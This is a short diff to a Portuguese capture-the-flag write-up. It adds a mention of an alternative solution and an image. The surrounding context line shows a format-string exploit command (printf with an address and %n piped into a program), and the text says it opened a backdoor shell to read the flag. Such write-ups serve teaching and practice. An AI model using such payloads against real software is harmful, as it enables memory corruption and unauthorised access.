@@ -45,3 +45,9 @@ printf "ABBC\x34\xc0\x04\x08%%48871p%%n" | ./program
 ![""](d2_backdoor.png)
 
 Conseguimos abrir a backdoor! Agora temos uma shell e basta ler a flag do flag.txt com `cat flag.txt`.
+
+Uma solução alternativa e que poupa tempo ...
+
+![](sol_alternativa.png)
+
+
